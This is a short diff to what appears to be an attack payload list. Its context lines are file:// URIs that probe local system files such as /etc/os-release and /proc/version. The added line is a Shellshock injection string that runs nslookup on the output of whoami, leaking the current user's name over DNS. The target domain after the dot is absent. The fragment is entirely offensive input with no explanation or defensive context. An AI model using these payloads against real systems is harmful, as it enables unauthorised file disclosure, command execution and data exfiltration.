@@ -86,3 +86,4 @@ file:///etc/sysconfig/network
 file:///etc/network/interfaces
 file:///proc/version
 file:///etc/os-release
+() { :; }; /bin/nslookup $(whoami).
